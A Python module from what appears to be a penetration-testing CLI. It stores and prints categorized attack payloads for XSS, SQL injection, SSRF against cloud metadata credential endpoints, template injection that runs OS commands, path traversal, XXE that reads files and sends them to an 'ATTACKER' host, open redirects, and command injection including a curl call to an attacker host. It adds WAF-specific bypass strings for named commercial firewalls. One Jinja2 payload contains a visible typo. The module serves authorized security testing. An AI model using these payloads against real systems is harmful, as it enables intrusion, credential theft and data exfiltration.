"""Payload knowledge base: context-aware payloads for confirmed vulnerability types."""

from oneinfinity.modules.utils import banner, section, bold, warn, info, cyan

# ── Payload registry ──────────────────────────────────────────────────────────

PAYLOADS: dict[str, dict[str, list[str]]] = {

"xss": {
    "html-body": [
        '<img src=x onerror=alert(document.domain)>',
        '<svg onload=alert(1)>',
        '<script>alert(document.domain)</script>',
        '<details open ontoggle=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '"><img src=x onerror=alert(1)>',
        "';alert(1)//",
    ],
    "attribute": [
        '" onfocus=alert(1) autofocus="',
        "' onfocus=alert(1) autofocus='",
        '" onmouseover=alert(1) x="',
        '" onload=alert(1) x="',
        '"><script>alert(1)</script>',
    ],
    "javascript-string": [
        "';alert(1)//",
        '";alert(1)//',
        '</script><script>alert(1)</script>',
        '\\u003cimg src=x onerror=alert(1)\\u003e',
        '${alert(1)}',
        '`${alert(1)}`',
    ],
    "href-src": [
        'javascript:alert(1)',
        'javascript:alert(document.domain)',
        'data:text/html,<script>alert(1)</script>',
    ],
    "dom": [
        '#"><img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '\\u003cimg src=x onerror=alert(1)\\u003e',
    ],
    "filter-bypass": [
        '<img src=x onerror=&#x61;lert(1)>',
        '<IMG SRC=x ONERROR=alert(1)>',
        '<svg/onload=alert(1)>',
        '<sc<script>ript>alert(1)</sc</script>ript>',
        '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
        '<<script>alert(1)//<</script>',
        '<iframe srcdoc="&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;">',
    ],
},

"sqli": {
    "error-based": [
        "'",
        '"',
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1--",
        "1' AND 1=2--",
        "1 AND 1=2",
        "') OR ('1'='1",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
    ],
    "boolean-blind": [
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1 AND SUBSTRING(username,1,1)='a'--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
    ],
    "time-based": [
        "1' AND SLEEP(5)--",
        "1'; WAITFOR DELAY '00:00:05'--",
        "1'; SELECT pg_sleep(5)--",
        "1' AND 1=dbms_pipe.receive_message('a',5)--",
        "1 AND SLEEP(5)",
        "1;SELECT+SLEEP(5)--",
    ],
    "union": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT 1,@@version,3--",
        "' UNION SELECT table_name FROM information_schema.tables--",
    ],
    "header-injection": [
        "' OR 1=1-- -",
        "1' OR '1'='1",
        "127.0.0.1' UNION SELECT 1,2,@@version#",
        "')",
    ],
    "waf-bypass": [
        "1'/**/AND/**/1=1--",
        "1' AND 0x31=0x31--",
        "1' AND 1=1 LIMIT 1--",
        "1'%20AND%201=1--",
        "1' /*!AND*/ 1=1--",
    ],
},

"ssrf": {
    "basic": [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://0",
    ],
    "cloud-metadata": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
    ],
    "filter-bypass": [
        "http://2130706433",
        "http://0177.0.0.1",
        "http://0x7f000001",
        "http://localtest.me",
        "http://127.0.0.1.nip.io",
        "http://[::ffff:127.0.0.1]",
        "http://①②⑦.①",
        "http://127.1",
    ],
    "protocol": [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO",
        "ftp://127.0.0.1",
    ],
    "dns-rebinding": [
        "http://A.8.8.8.8.1time.127.0.0.1.1time.repeat.rebind.network/",
    ],
},

"ssti": {
    "detection": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "{7*7}",
        "<%= 7*7 %>",
        "{{7*'7'}}",
        "${{7*7}}",
        "@(7+7)",
    ],
    "jinja2": [
        "{{config}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''..__class__.__bases__[0].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    "twig": [
        "{{7*7}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
    "freemarker": [
        "${7*7}",
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    ],
    "erb-ruby": [
        "<%= 7*7 %>",
        "<%= system('id') %>",
        "<%= `id` %>",
    ],
    "velocity": [
        "#set($x=7*7)${x}",
        '#set($str=$class.inspect("java.lang.Runtime").type)',
    ],
},

"path-traversal": {
    "basic": [
        "../etc/passwd",
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
    ],
    "encoded": [
        "..%2fetc%2fpasswd",
        "..%252fetc%252fpasswd",
        "%2e%2e%2fetc%2fpasswd",
        "..%c0%afetc%c0%afpasswd",
        "..%ef%bc%8fetc%ef%bc%8fpasswd",
    ],
    "windows": [
        "..\\windows\\win.ini",
        "..\\..\\windows\\win.ini",
        "..%5cwindows%5cwin.ini",
        "....//....//windows//win.ini",
    ],
    "null-byte": [
        "../etc/passwd%00",
        "../etc/passwd%00.jpg",
        "../etc/passwd\x00",
    ],
},

"xxe": {
    "basic": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    ],
    "oob": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]><foo>test</foo>',
    ],
    "ssrf-via-xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&ssrf;</foo>',
    ],
    "parameter-entities": [
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'http://ATTACKER/?x=%file;\'>">%eval;%exfiltrate;]><data>test</data>',
    ],
},

"open-redirect": {
    "basic": [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https://evil.com/%2f..",
    ],
    "encoded": [
        "%2f%2fevil.com",
        "%68%74%74%70%73%3a%2f%2fevil.com",
        "https:%2f%2fevil.com",
    ],
    "domain-confusion": [
        "https://TARGET.com.evil.com",
        "https://TARGETXcom.evil.com",
        "https://evil.com?TARGET.com",
        "https://evil.com#TARGET.com",
    ],
    "protocol": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
},

"command-injection": {
    "unix": [
        "; id",
        "| id",
        "|| id",
        "&& id",
        "`id`",
        "$(id)",
        "%0aid",
        "\nid",
    ],
    "windows": [
        "& whoami",
        "| whoami",
        "; whoami",
        "% whoami",
        "\r\nwhoami",
    ],
    "blind": [
        "; sleep 5",
        "| sleep 5",
        "; ping -c 5 127.0.0.1",
        "; curl http://ATTACKER",
        "; nslookup ATTACKER",
    ],
    "filter-bypass": [
        "; $IFS id",
        ";{id}",
        ";i''d",
        ";i$()d",
        ";\\id",
    ],
},

}

# WAF-specific bypass strategies
WAF_BYPASSES: dict[str, dict[str, list[str]]] = {
    "Cloudflare": {
        "xss": [
            '<svg/onload=\\u0061lert(1)>',
            '<img src=x onerror=alert`1`>',
            '<img src=x onerror=window[\'alert\'](1)>',
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        ],
        "sqli": [
            "/*!SELECT*/",
            "1'/**/OR/**/1=1--",
            "1' OR 0x31=0x31--",
            "1'%0aOR%0a1=1--",
        ],
    },
    "ModSecurity": {
        "xss": [
            '<img src=x onerror=al\u0065rt(1)>',
            '<<script>alert(1)//<</script>',
            '<img src="x`x" onerror=alert(1)>',
        ],
        "sqli": [
            "1' /*!UNION*/ /*!SELECT*/ 1,2,3--",
            "1' AND 1 IN (SELECT 1)--",
        ],
    },
    "AWS WAF": {
        "sqli": [
            "1' AND 0x31=0x31--",
            "1'/**/AND/**/1=1--",
        ],
        "xss": [
            '<svg><animatetransform onbegin=alert(1)>',
        ],
    },
    "Akamai": {
        "xss": [
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
        ],
        "sqli": [
            "1'%09OR%091=1--",
            "1'%0dOR%0d1=1--",
        ],
    },
}


class PayloadKB:
    def list_types(self):
        banner("Payload Knowledge Base")
        section("Vulnerability Types")
        for key in PAYLOADS:
            contexts = list(PAYLOADS[key].keys())
            print(f"  {bold(key):<25} contexts: {', '.join(contexts)}")
        print()
        section("WAF Bypass Strategies")
        for waf in WAF_BYPASSES:
            vulns = list(WAF_BYPASSES[waf].keys())
            print(f"  {bold(waf):<20} {', '.join(vulns)}")
        print()
        info("Usage: oneinfinity payloads <type> [context]")
        info("Usage: oneinfinity waf-bypass <waf> <vuln-type>")

    def get(self, vuln_type: str, context: str = None):
        key = vuln_type.lower()
        if key not in PAYLOADS:
            warn(f"Unknown type: '{key}'. Available: {', '.join(PAYLOADS.keys())}")
            return

        banner(f"Payloads — {vuln_type.upper()}")

        if context:
            ctx = context.lower()
            # Find matching context
            match = None
            for c in PAYLOADS[key]:
                if ctx in c.lower():
                    match = c
                    break
            if not match:
                warn(f"Context '{context}' not found for {key}.")
                info(f"Available: {', '.join(PAYLOADS[key].keys())}")
                return
            section(match)
            for p in PAYLOADS[key][match]:
                print(f"  {p}")
        else:
            for ctx, payloads in PAYLOADS[key].items():
                section(ctx)
                for p in payloads:
                    print(f"  {p}")

        print()
        warn("Use these in the context of your authorized program only.")
        warn("Confirm the vulnerability exists before crafting advanced payloads.")

    def waf_bypass(self, waf: str, vuln_type: str):
        waf_key = None
        for k in WAF_BYPASSES:
            if waf.lower() in k.lower():
                waf_key = k
                break

        if not waf_key:
            warn(f"No bypass strategies for WAF: '{waf}'")
            info(f"Available WAFs: {', '.join(WAF_BYPASSES.keys())}")
            return

        banner(f"WAF Bypass — {waf_key} / {vuln_type.upper()}")
        vuln_key = vuln_type.lower()
        strategies = WAF_BYPASSES[waf_key].get(vuln_key)
        if not strategies:
            warn(f"No {vuln_type} bypass payloads for {waf_key}")
            info(f"Available vuln types: {', '.join(WAF_BYPASSES[waf_key].keys())}")
            return

        for p in strategies:
            print(f"  {p}")
        print()
        warn("These are starting points. WAF rules change — adapt based on actual responses.")
        info("Tip: Test incrementally. Observe which characters/keywords get blocked.")
